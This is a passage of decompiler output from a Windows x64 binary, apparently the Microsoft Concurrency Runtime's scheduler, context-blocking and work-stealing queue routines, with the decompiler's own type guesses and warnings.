  sub_13F142864(*(_QWORD *)(a1 + 280));
  return sub_13F149264(*(volatile signed __int32 **)(a1 + 56), a1, 0);
}
// 13F142864: using guessed type __int64 __fastcall sub_13F142864(_QWORD);

//----- (000000013F15A310) ----------------------------------------------------
bool __fastcall sub_13F15A310(__int64 a1)
{
  return *(_DWORD *)(a1 + 84) == 1;
}

//----- (000000013F15A31C) ----------------------------------------------------
__int64 __fastcall sub_13F15A31C(__int64 a1, char a2)
{
  int v2; // eax
  __int64 result; // rax
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  v2 = *(_DWORD *)(a1 + 44);
  if ( a2 )
  {
    result = (unsigned int)(v2 + 1);
  }
  else
  {
    if ( !v2 )
    {
      sub_13F142D48(pExceptionObject);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_oversubscribe_operation_Concurrency__);
    }
    result = (unsigned int)(v2 - 1);
  }
  *(_DWORD *)(a1 + 44) = result;
  return result;
}
// 13F15A31C: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F15A358) ----------------------------------------------------
__int64 __fastcall sub_13F15A358(__int64 a1, char a2)
{
  __int64 result; // rax
  __int64 v5; // rdi
  __int64 v6; // rbx
  __int64 v7; // rax
  int v8; // eax
  int v9; // edx
  int v10; // eax
  int v11; // edx
  char pExceptionObject[32]; // [rsp+40h] [rbp-28h] BYREF

  *(_BYTE *)(a1 + 240) = a2;
  result = MEMORY[0x76F83380]();
  *(_DWORD *)(a1 + 128) = result;
  if ( !a2 )
  {
    v5 = MEMORY[0x76F85190]();
    v6 = MEMORY[0x76F833C0]();
    v7 = MEMORY[0x76F85190]();
    if ( !(unsigned int)MEMORY[0x76F851B0](v7, v6, v5, a1 + 264, 0, 0, 2) )
    {
      v8 = MEMORY[0x76F91760]();
      v9 = (unsigned __int16)v8 | 0x80070000;
      if ( v8 <= 0 )
        v9 = v8;
      sub_13F142E40((__int64)pExceptionObject, v9);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
    }
    if ( (int)sub_13F1454C0() < 3 )
    {
      result = sub_13F1426B8(*(_QWORD *)(a1 + 264), (__int64)sub_13F15A2E4, a1);
      *(_QWORD *)(a1 + 280) = result;
    }
    else
    {
      result = sub_13F142AEC();
      *(_QWORD *)(a1 + 280) = result;
      if ( !result )
      {
        v10 = MEMORY[0x76F91760]();
        v11 = (unsigned __int16)v10 | 0x80070000;
        if ( v10 <= 0 )
          v11 = v10;
        sub_13F142E40((__int64)pExceptionObject, v11);
        CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
      }
    }
  }
  return result;
}
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);

//----- (000000013F15A488) ----------------------------------------------------
void __fastcall sub_13F15A488(__int64 a1, __int64 a2)
{
  sub_13F14EC9C(a1, a2);
  if ( *(_QWORD *)(a1 + 264) )
  {
    MEMORY[0x76F91910]();
    *(_QWORD *)(a1 + 264) = 0i64;
  }
}

//----- (000000013F15A4C8) ----------------------------------------------------
__int64 __fastcall sub_13F15A4C8(__int64 a1)
{
  signed __int32 v2; // eax
  __int64 result; // rax
  __int64 v4[3]; // [rsp+20h] [rbp-38h] BYREF
  __int64 pExceptionObject[4]; // [rsp+38h] [rbp-20h] BYREF

  if ( a1 == sub_13F1492D4() )
  {
    sub_13F142C9C(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVcontext_self_unblock_Concurrency__);
  }
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 56) + 8i64))(*(_QWORD *)(a1 + 56));
  v2 = _InterlockedDecrement((volatile signed __int32 *)(a1 + 84));
  if ( !v2 )
    return MEMORY[0x76F833A0](*(_QWORD *)(a1 + 272));
  result = (unsigned int)(v2 + 1);
  if ( (unsigned int)result > 1 )
  {
    sub_13F142CB4(v4);
    CxxThrowException(v4, (_ThrowInfo *)&_TI2_AVcontext_unblock_unbalanced_Concurrency__);
  }
  return result;
}
// 13F15A511: conditional instruction was optimized away because cl.1==0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;
// 13F15A4C8: using guessed type _QWORD pExceptionObject[4];
// 13F15A4C8: using guessed type _QWORD var_38[3];

//----- (000000013F15A58C) ----------------------------------------------------
__int64 __fastcall sub_13F15A58C(__int64 a1)
{
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 56) + 8i64))(*(_QWORD *)(a1 + 56));
  return sub_13F1427C4();
}
// 13F1427C4: using guessed type __int64 sub_13F1427C4(void);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;

//----- (000000013F15A5D8) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A5D8(_QWORD *a1, _OWORD **a2)
{
  *a1 = &Concurrency::IScheduler::`vftable';
  sub_13F147B44((__int64)(a1 + 2), a2);
  *a1 = off_13F18C198;
  a1[2] = off_13F18C1D8;
  return a1;
}
// 13F18C070: using guessed type void *Concurrency::IScheduler::`vftable';
// 13F18C198: using guessed type __int64 (__fastcall *off_13F18C198[8])();
// 13F18C1D8: using guessed type __int64 (__fastcall *off_13F18C1D8[24])();

//----- (000000013F15A61C) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A61C(__int64 a1, __int64 a2)
{
  return sub_13F15A634((_QWORD *)(a1 - 16), a2);
}

//----- (000000013F15A628) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A628(__int64 a1, __int64 a2)
{
  return sub_13F15A680((_QWORD *)(a1 - 16), a2);
}

//----- (000000013F15A634) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A634(_QWORD *a1, __int64 a2)
{
  char v2; // bl

  v2 = a2;
  *a1 = off_13F18C0B0;
  a1[2] = off_13F18C100;
  sub_13F156008(a1, a2);
  if ( (v2 & 1) != 0 )
    sub_13F14088C(a1, 384i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18C0B0: using guessed type void *off_13F18C0B0[10];
// 13F18C100: using guessed type __int64 (__fastcall *off_13F18C100[19])();

//----- (000000013F15A680) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A680(_QWORD *a1, __int64 a2)
{
  char v3; // bl
  _QWORD *v4; // rcx

  *a1 = off_13F18C198;
  v3 = a2;
  v4 = a1 + 2;
  *v4 = off_13F18C1D8;
  sub_13F14824C((__int64)v4, a2);
  if ( (v3 & 1) != 0 )
    sub_13F14088C(a1, 832i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18C198: using guessed type __int64 (__fastcall *off_13F18C198[8])();
// 13F18C1D8: using guessed type __int64 (__fastcall *off_13F18C1D8[24])();

//----- (000000013F15A6CC) ----------------------------------------------------
signed __int64 __fastcall sub_13F15A6CC(__int64 a1, _QWORD *a2, unsigned int a3)
{
  return sub_13F148710(a1 + 16, a2, a3);
}

//----- (000000013F15A6D8) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A6D8(_OWORD **a1)
{
  _QWORD *v2; // rcx
  _QWORD *result; // rax

  v2 = (_QWORD *)sub_13F14059C(832i64);
  result = 0i64;
  if ( v2 )
    return sub_13F15A5D8(v2, a1);
  return result;
}

//----- (000000013F15A714) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A714(__int64 a1)
{
  _QWORD *v2; // rbx

  v2 = (_QWORD *)sub_13F14059C(384i64);
  if ( !v2 )
    return 0i64;
  sub_13F155E78((__int64)v2, a1 & ((unsigned __int128)-(__int128)(unsigned __int64)(a1 - 16) >> 64));
  *v2 = off_13F18C0B0;
  v2[2] = off_13F18C100;
  return v2;
}
// 13F18C0B0: using guessed type void *off_13F18C0B0[10];
// 13F18C100: using guessed type __int64 (__fastcall *off_13F18C100[19])();

//----- (000000013F15A780) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A780(__int64 a1, __int64 a2, __int64 a3)
{
  _QWORD *v5; // rcx
  _QWORD *result; // rax

  v5 = (_QWORD *)sub_13F14059C(368i64);
  result = 0i64;
  if ( v5 )
    return sub_13F15DDE4(v5, a2, a3);
  return result;
}

//----- (000000013F15A7CC) ----------------------------------------------------
__int64 __fastcall sub_13F15A7CC(__int64 a1)
{
  return a1 - 16;
}

//----- (000000013F15A7D4) ----------------------------------------------------
__int64 __fastcall sub_13F15A7D4(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 8i64))(a1 + 16);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15A7E8) ----------------------------------------------------
__int64 *__fastcall sub_13F15A7E8(__int64 a1, __int64 *a2)
{
  sub_13F14A020(a1 + 16, a2);
  return a2;
}

//----- (000000013F15A804) ----------------------------------------------------
__int64 *__fastcall sub_13F15A804(__int64 a1, __int64 *a2)
{
  return sub_13F15A7E8(a1 - 16, a2);
}

//----- (000000013F15A828) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F15A828()
{
  __int64 result; // rax
  int v1; // eax
  int v2; // edx
  char pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF

  result = MEMORY[0x76F865A0]();
  dword_13F1C5ED0 = result;
  if ( (_DWORD)result == -1 )
  {
    v1 = MEMORY[0x76F91760]();
    v2 = (unsigned __int16)v1 | 0x80070000;
    if ( v1 <= 0 )
      v2 = v1;
    sub_13F142E40((__int64)pExceptionObject, v2);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 13F15A832: write access to const memory at 13F1C5ED0 has been detected
// 13F1C5ED0: using guessed type int dword_13F1C5ED0;

//----- (000000013F15A874) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F15A874()
{
  __int64 result; // rax

  result = MEMORY[0x76F80A30](0i64);
  dword_13F1C5ED0 = 0;
  return result;
}
// 13F15A884: write access to const memory at 13F1C5ED0 has been detected
// 13F1C5ED0: using guessed type int dword_13F1C5ED0;

//----- (000000013F15A890) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A890(_QWORD *a1, _QWORD *a2)
{
  sub_13F178D74(a1, a2);
  return a1;
}

//----- (000000013F15A8B4) ----------------------------------------------------
signed __int64 __fastcall sub_13F15A8B4(__int64 a1, __int64 a2)
{
  signed __int64 result; // rax
  signed __int64 v4; // rtt
  signed __int64 v5; // rdx

  v4 = *(_QWORD *)(a1 + 40);
  result = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 40), a2 | v4 & 0xFFFFFFFFFFFFFFFCui64, v4);
  if ( v4 != result )
  {
    do
    {
      v5 = result;
      result = _InterlockedCompareExchange64(
                 (volatile signed __int64 *)(a1 + 40),
                 a2 | result & 0xFFFFFFFFFFFFFFFCui64,
                 result);
    }
    while ( result != v5 );
  }
  return result;
}

//----- (000000013F15A8EC) ----------------------------------------------------
__int64 __fastcall sub_13F15A8EC(__int64 a1, unsigned __int64 *a2)
{
  __int64 result; // rax
  unsigned __int64 v3; // rcx

  result = *(_QWORD *)(a1 + 16);
  v3 = 0i64;
  if ( (result & 1) != 0 )
  {
    v3 = result & 0xFFFFFFFFFFFFFFFEui64;
    if ( (result & 0xFFFFFFFFFFFFFFFEui64) != 0 )
      result = *(_QWORD *)(v3 + 184);
    else
      result = 2i64;
  }
  if ( a2 )
    *a2 = v3;
  return result;
}

//----- (000000013F15A918) ----------------------------------------------------
char __fastcall sub_13F15A918(__int64 a1)
{
  signed __int64 v1; // rax
  signed __int64 v2; // rtt

  v1 = *(_QWORD *)(a1 + 40);
  do
  {
    if ( (v1 & 3) != 0 )
      return 0;
    v2 = v1;
    v1 = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 40), v1 | 1, v1);
  }
  while ( v2 != v1 );
  return 1;
}

//----- (000000013F15A938) ----------------------------------------------------
signed __int64 __fastcall sub_13F15A938(__int64 a1)
{
  signed __int64 result; // rax
  signed __int64 v3; // rtt
  _QWORD *v4; // rax
  unsigned __int64 v5; // rbx
  signed __int64 v6; // rtt
  signed __int64 v7; // rdx

  result = *(_QWORD *)(a1 + 40);
  while ( (result & 0xFFFFFFFFFFFFFFFCui64) == 0 || (result & 0xFFFFFFFFFFFFFFFCui64) == 12 )
  {
    v3 = result;
    result = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 40), result & 3 | 8, result);
    if ( v3 == result )
    {
      v4 = (_QWORD *)sub_13F14059C(16i64);
      v5 = (unsigned __int64)v4;
      if ( v4 )
      {
        sub_13F178D9C(v4);
        sub_13F178DA8((_QWORD *)v5);
      }
      else
      {
        v5 = 0i64;
      }
      v6 = *(_QWORD *)(a1 + 40);
      result = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 40), v5 | v6 & 3, v6);
      if ( v6 != result )
      {
        do
        {
          v7 = result;
          result = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 40), v5 | result & 3, result);
        }
        while ( result != v7 );
      }
      return result;
    }
  }
  return result;
}

//----- (000000013F15A9D4) ----------------------------------------------------
void __fastcall sub_13F15A9D4(__int64 a1)
{
  __int64 v2; // rbx
  _QWORD *v3; // rcx
  __int64 v4[2]; // [rsp+28h] [rbp-30h] BYREF
  __int64 v5[4]; // [rsp+38h] [rbp-20h] BYREF

  v2 = *(_QWORD *)(a1 + 40) & 0xFFFFFFFFFFFFFFFCui64;
  if ( v2 && v2 != 12 )
  {
    sub_13F178D74(v4, (_QWORD *)(*(_QWORD *)(a1 + 40) & 0xFFFFFFFFFFFFFFFCui64));
    sub_13F178E30(v2);
    sub_13F14088C(v2, 16i64);
    *(_QWORD *)(a1 + 40) = 0i64;
    if ( !sub_13F15FBC0() )
    {
      v3 = sub_13F15A890(v5, v4);
      sub_13F15AA68((__int64)v3);
    }
    sub_13F178E30((__int64)v4);
  }
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F15A9D4: using guessed type _QWORD var_30[2];
// 13F15A9D4: using guessed type __int64 var_20[4];

//----- (000000013F15AA5C) ----------------------------------------------------
void __fastcall __noreturn sub_13F15AA5C(__int64 a1)
{
  sub_13F178E38(a1);
}

//----- (000000013F15AA68) ----------------------------------------------------
void __fastcall __noreturn sub_13F15AA68(__int64 a1)
{
  sub_13F15AA5C(a1);
}

//----- (000000013F15AA80) ----------------------------------------------------
__int64 __fastcall sub_13F15AA80(__int64 a1, __int64 a2)
{
  __int64 v3; // rdx
  __int64 v4; // rax
  __int64 v5; // rcx
  __int64 v6; // rdx

  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_QWORD *)(a1 + 16) = a2;
  *(_DWORD *)a1 = 0;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 8) = 63;
  *(_QWORD *)(a1 + 32) = sub_13F1790C4(512i64, a2);
  v4 = sub_13F1790C4(1024i64, v3);
  if ( v4 )
  {
    v5 = v4;
    v6 = 64i64;
    do
    {
      *(_QWORD *)v5 = 0i64;
      *(_DWORD *)(v5 + 8) = 0;
      v5 += 16i64;
      --v6;
    }
    while ( v6 );
  }
  *(_QWORD *)(a1 + 40) = v4;
  return a1;
}
// 13F15AAC0: variable 'v3' is possibly undefined
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F15AAF8) ----------------------------------------------------
__int64 __fastcall sub_13F15AAF8(__int64 a1)
{
  _DWORD *v2; // rbx

  v2 = (_DWORD *)(a1 + 224);
  sub_13F15432C(a1, a1 + 224);
  *(_DWORD *)(a1 + 144) = 0;
  *(_QWORD *)(a1 + 168) = 0i64;
  sub_13F15AA80(a1 + 176, (__int64)v2);
  *v2 = 0;
  *(_DWORD *)(a1 + 96) = 0;
  *(_QWORD *)(a1 + 128) = a1;
  *(_DWORD *)(a1 + 160) = sub_13F149E98();
  return a1;
}

//----- (000000013F15AB70) ----------------------------------------------------
__int64 __fastcall sub_13F15AB70(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 152) = a2;
  return sub_13F14AA74(
           (__int64 (__fastcall **)(__int64))(a1 + 64),
           sub_13F15AC2C,
           (__int64 (__fastcall *)(__int64))a1,
           *(_QWORD *)(*(_QWORD *)(a2 + 424) + 8i64));
}

//----- (000000013F15AB98) ----------------------------------------------------
__int64 __fastcall sub_13F15AB98(__int64 a1)
{
  _DWORD *v1; // rbx

  v1 = (_DWORD *)(a1 + 224);
  sub_13F142BD8((volatile __int32 *)(a1 + 224));
  *(_DWORD *)(a1 + 160) = sub_13F149E98();
  *(_DWORD *)a1 = 0;
  *(_DWORD *)(a1 + 4) = 0;
  *(_DWORD *)(a1 + 176) = 0;
  *(_DWORD *)(a1 + 180) = 0;
  *(_DWORD *)(a1 + 204) = 0;
  *(_BYTE *)(a1 + 200) = 0;
  *(_DWORD *)(a1 + 188) = 0;
  *(_DWORD *)(a1 + 144) = 0;
  *(_QWORD *)(a1 + 168) = 0i64;
  return sub_13F142C20(v1);
}

//----- (000000013F15AC04) ----------------------------------------------------
__int64 __fastcall sub_13F15AC04(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 152) = a2;
  return sub_13F14AA74(
           (__int64 (__fastcall **)(__int64))(a1 + 64),
           (__int64 (__fastcall *)(__int64))sub_13F15AC3C,
           (__int64 (__fastcall *)(__int64))a1,
           *(_QWORD *)(*(_QWORD *)(a2 + 424) + 8i64));
}

//----- (000000013F15AC2C) ----------------------------------------------------
__int64 __fastcall sub_13F15AC2C(__int64 a1)
{
  return sub_13F158588(*(_QWORD *)(a1 + 152) + 288i64, (_DWORD *)(a1 + 96));
}

//----- (000000013F15AC3C) ----------------------------------------------------
char __fastcall sub_13F15AC3C(signed __int64 a1)
{
  return sub_13F15961C(*(_QWORD *)(a1 + 152), a1);
}

//----- (000000013F15AC4C) ----------------------------------------------------
__int64 __fastcall sub_13F15AC4C(__int64 a1, char a2)
{
  _DWORD *v4; // rbx
  __int64 v5; // rdi

  v4 = (_DWORD *)(a1 + 224);
  sub_13F142BD8((volatile __int32 *)(a1 + 224));
  v5 = sub_13F15AF18(a1, a2);
  sub_13F142C20(v4);
  return v5;
}

//----- (000000013F15ACA8) ----------------------------------------------------
__int64 __fastcall sub_13F15ACA8(
        __int64 a1,
        unsigned __int8 (__fastcall *a2)(_QWORD, __int64),
        __int64 a3,
        unsigned __int8 (__fastcall *a4)(__int64, __int64))
{
  __int32 v7; // esi
  __int32 v8; // edi
  int v9; // ebp
  unsigned __int64 v10; // rcx
  __int64 v11; // rax
  __int64 v12; // r14
  volatile __int32 *v14; // [rsp+70h] [rbp+8h]

  v14 = *(volatile __int32 **)(a1 + 16);
  sub_13F142BD8(v14);
  v7 = *(_DWORD *)(a1 + 4);
  v8 = v7 - 1;
  if ( v7 - 1 >= *(_DWORD *)a1 )
  {
    v9 = *(_DWORD *)(a1 + 4);
    do
    {
      v10 = v8 & (unsigned __int64)*(int *)(a1 + 8);
      v11 = *(_QWORD *)(a1 + 32);
      v12 = *(_QWORD *)(v11 + 8 * v10);
      if ( v12 && a2(*(_QWORD *)(v11 + 8 * v10), a3) && a4(v12, a3) )
      {
        if ( v9 == v7 )
          --v7;
        else
          *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * (v8 & (unsigned __int64)*(int *)(a1 + 8))) = 0i64;
      }
      --v8;
      --v9;
    }
    while ( v8 >= *(_DWORD *)a1 );
  }
  _InterlockedExchange((volatile __int32 *)(a1 + 4), v7);
  return sub_13F142C20(v14);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15AD88) ----------------------------------------------------
__int64 __fastcall sub_13F15AD88(__int64 a1, char a2, _BYTE *a3)
{
  __int64 v6; // rbx
  _DWORD *v7; // r14

  v6 = 0i64;
  v7 = (_DWORD *)(a1 + 224);
  if ( sub_13F142C34((volatile __int32 *)(a1 + 224)) )
  {
    v6 = sub_13F15AF18(a1, a2);
    sub_13F142C20(v7);
    *a3 = 1;
  }
  else
  {
    *a3 = 0;
  }
  return v6;
}

//----- (000000013F15ADF4) ----------------------------------------------------
__int64 __fastcall sub_13F15ADF4(__int64 a1, char a2)
{
  volatile __int32 v2; // edi
  __int64 v5; // r8
  volatile __int32 i; // eax
  unsigned __int64 v7; // rcx
  unsigned int *v8; // r9
  __int64 v9; // r10
  __int64 v10; // r8

  v2 = *(_DWORD *)a1;
  v5 = 0i64;
  _InterlockedExchange((volatile __int32 *)a1, *(_DWORD *)a1 + 1);
  for ( i = *(_DWORD *)(a1 + 4); v2 < i; i = *(_DWORD *)(a1 + 4) )
  {
    v7 = v2 & (unsigned __int64)*(int *)(a1 + 8);
    if ( (*(_BYTE *)(*(_QWORD *)(a1 + 32) + 8 * v7) & 1) != 0
      && !a2
      && sub_13F155830((_QWORD **)(*(_QWORD *)(a1 + 40) + 16 * v7)) )
    {
      *(_DWORD *)a1 = v2;
      return 0i64;
    }
    if ( *(_BYTE *)(a1 + 24) && *(_DWORD *)a1 >= *(_DWORD *)(a1 + 28) )
      *(_BYTE *)(a1 + 24) = 0;
    v5 = _InterlockedExchange64(
           (volatile __int64 *)(*(_QWORD *)(a1 + 32) + 8 * (v2 & (unsigned __int64)*(int *)(a1 + 8))),
           0i64);
    if ( v5 )
    {
      if ( (v5 & 1) == 0 )
        return v5;
      v5 &= ~1ui64;
      v8 = (unsigned int *)(*(_QWORD *)(a1 + 40) + 16 * (v2 & (unsigned __int64)*(int *)(a1 + 8)));
      v9 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)v8 + 24i64) + 8i64 * v8[2]);
      if ( v9 != 1
        && _InterlockedExchange64((volatile __int64 *)(*(_QWORD *)(*(_QWORD *)v8 + 24i64) + 8i64 * v8[2]), 1i64) == v9 )
      {
        return v5;
      }
      v10 = *(_QWORD *)v8;
      if ( _InterlockedExchangeAdd((volatile signed __int32 *)(*(_QWORD *)v8 + 36i64), 0xFFFFFFFF) == 1 )
        sub_13F14AA74(
          (__int64 (__fastcall **)(__int64))(v10 + 48),
          (__int64 (__fastcall *)(__int64))sub_13F14EF30,
          (__int64 (__fastcall *)(__int64))v10,
          *(_QWORD *)v10);
      v5 = 0i64;
    }
    v2 = *(_DWORD *)a1;
    _InterlockedExchange((volatile __int32 *)a1, *(_DWORD *)a1 + 1);
  }
  *(_DWORD *)a1 = v2;
  return v5;
}

//----- (000000013F15AF18) ----------------------------------------------------
__int64 __fastcall sub_13F15AF18(__int64 a1, char a2)
{
  _DWORD *v2; // rsi
  __int64 result; // rax
  int *v6; // rcx
  __int64 v7; // rbx
  __int64 v8; // rax
  __int64 v9; // rcx
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rcx
  char v14; // dl

  v2 = (_DWORD *)(a1 + 176);
  if ( *(_DWORD *)(a1 + 4) <= *(_DWORD *)a1 && *(_DWORD *)(a1 + 180) <= *v2 )
    return 0i64;
  v6 = *(int **)(a1 + 168);
  v7 = 0i64;
  if ( v6 && v6[47] > 0 && !(*(unsigned __int8 (__fastcall **)(int *))(*(_QWORD *)v6 + 32i64))(v6) )
  {
    if ( !*(_BYTE *)(a1 + 200) || (v8 = sub_13F15ADF4((__int64)v2, a2), (v7 = v8) == 0) )
    {
      v10 = sub_13F1492D4();
      if ( v10 )
        v11 = v10 + 279;
      else
        v11 = 295i64;
      *(_BYTE *)v11 |= 2u;
      return v7;
    }
    v9 = v8;
    goto LABEL_20;
  }
  result = sub_13F155B54((int *)a1, a2);
  if ( result )
    return result;
  v12 = sub_13F15ADF4((__int64)v2, a2);
  v7 = v12;
  if ( v12 )
  {
    v13 = *(_QWORD *)(a1 + 168);
    if ( v13 && *(_QWORD *)(*(_QWORD *)(v12 + 16) + 24i64) == v13 )
    {
      sub_13F14EC94(v13);
      v14 = 0;
      v9 = v7;
LABEL_21:
      sub_13F15B180(v9, v14);
      return v7;
    }
    v9 = v12;
LABEL_20:
    v14 = 1;
    goto LABEL_21;
  }
  return v7;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15B028) ----------------------------------------------------
void __fastcall sub_13F15B028(__int64 a1)
{
  _InterlockedExchange((volatile __int32 *)(a1 + 192), 1);
  sub_13F14E1C0(a1, -999);
  sub_13F14E26C(a1, 0i64);
}

//----- (000000013F15B058) ----------------------------------------------------
__int64 __fastcall sub_13F15B058(__int64 (__fastcall ***a1)(_QWORD, __int64))
{
  return (**a1)(a1, 1i64);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15B06C) ----------------------------------------------------
void __fastcall sub_13F15B06C(__int64 a1, __int64 a2)
{
  if ( *(__int64 (__fastcall **)(__int64))(a1 + 24) == sub_13F15B184 )
    sub_13F15B084(a1, a2);
  else
    sub_13F15B0C8(a1, a2);
}

//----- (000000013F15B084) ----------------------------------------------------
void __fastcall sub_13F15B084(__int64 a1, __int64 a2)
{
  __int64 v2; // r8
  __int64 v3; // rax
  __int64 v4; // rcx

  v2 = (a2 - 16) & -(__int64)(a2 != 0);
  if ( !*(_QWORD *)(v2 + 0x68) )
  {
    v3 = *(_QWORD *)(a1 + 16);
    v4 = *(_QWORD *)(v3 + 24);
    *(_QWORD *)(((a2 - 16) & -(__int64)(a2 != 0)) + 0x68) = v3;
    *(_QWORD *)(((a2 - 16) & -(__int64)(a2 != 0)) + 0x70) = v3;
    sub_13F14E0F8(v4, (v2 + 16) & -(__int64)(v2 != 0), 0);
  }
}

//----- (000000013F15B0C8) ----------------------------------------------------
void __fastcall sub_13F15B0C8(__int64 a1, __int64 a2)
{
  __int64 v3; // rax
  __int64 v4; // rdi
  __int64 v5; // rsi
  __int64 v6; // rbp
  __int64 v7; // rax
  __int64 v8; // rdx

  v3 = a2 + 88;
  if ( !a2 )
    v3 = 104i64;
  if ( !*(_QWORD *)v3 )
  {
    v4 = *(_QWORD *)(a1 + 16);
    v5 = a2;
    if ( !a2 )
      v5 = 16i64;
    v6 = *(_QWORD *)(v4 + 24);
    *(_QWORD *)(v5 + 88) = v4;
    *(_QWORD *)(v5 + 96) = v4;
    if ( *(_BYTE *)(a1 + 33) )
    {
      v7 = a2 + 137;
      if ( !a2 )
        v7 = 153i64;
      v8 = a2 + 160;
      *(_BYTE *)v7 = 0;
      if ( !a2 )
        v8 = 176i64;
      sub_13F14E148((volatile signed __int32 *)(v4 + 48), (_QWORD *)v8);
    }
    else
    {
      sub_13F141A20((volatile signed __int32 *)(v4 + 56));
      ++*(_DWORD *)(v4 + 80);
      sub_13F141BE8(v4 + 56);
      sub_13F14E0F8(v6, v5, 1);
    }
  }
}

//----- (000000013F15B180) ----------------------------------------------------
void __fastcall sub_13F15B180(__int64 a1, char a2)
{
  *(_BYTE *)(a1 + 33) = a2;
}

//----- (000000013F15B184) ----------------------------------------------------
__int64 __fastcall sub_13F15B184(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  __int64 v4; // r14
  __int64 v5; // rax
  __int64 v6; // r15
  volatile signed __int32 *v7; // rdi
  __int64 v9; // [rsp+38h] [rbp-50h]
  __int64 pExceptionObject[8]; // [rsp+48h] [rbp-40h] BYREF

  v2 = sub_13F1492D4();
  if ( v2 )
    v3 = v2 - 16;
  else
    v3 = 0i64;
  v4 = *(_QWORD *)(a1 + 16);
  v9 = *(_QWORD *)(v4 + 24);
  sub_13F15B084(a1, (v3 + 16) & ((unsigned __int128)-(__int128)(unsigned __int64)v3 >> 64));
  v5 = sub_13F15A8EC(v4, 0i64);
  v6 = v5;
  v7 = 0i64;
  if ( (v5 & 0xFFFFFFFFFFFFFFFDui64) != 0 )
    v7 = (volatile signed __int32 *)sub_13F15065C(v5, (__int64)sub_13F15B028, (v3 + 16) & -(__int64)(v3 != 0), 1);
  if ( *(_QWORD *)(v4 + 40) )
  {
    sub_13F14F434(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AV_Interruption_exception_details_Concurrency__);
  }
  (*(void (__fastcall **)(__int64))(a1 + 8))(a1);
  sub_13F14EF0C(v9, (v3 + 16) & ((unsigned __int128)-(__int128)(unsigned __int64)v3 >> 64));
  if ( v7 )
  {
    sub_13F150140(v6, (__int64)v7);
    if ( _InterlockedExchangeAdd(v7 + 2, 0xFFFFFFFF) == 1 )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
  }
  *(_DWORD *)(v3 + 196) = -1;
  *(_DWORD *)(v3 + 200) = -1;
  *(_DWORD *)(v3 + 204) = 0;
  *(_DWORD *)(v3 + 208) = 0;
  *(_QWORD *)(v3 + 104) = 0i64;
  *(_QWORD *)(v3 + 112) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  return sub_13F150110(v4);
}
// 13F15B184: could not find valid save-restore pair for rbp
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15B184: using guessed type _QWORD pExceptionObject[8];

//----- (000000013F15B338) ----------------------------------------------------
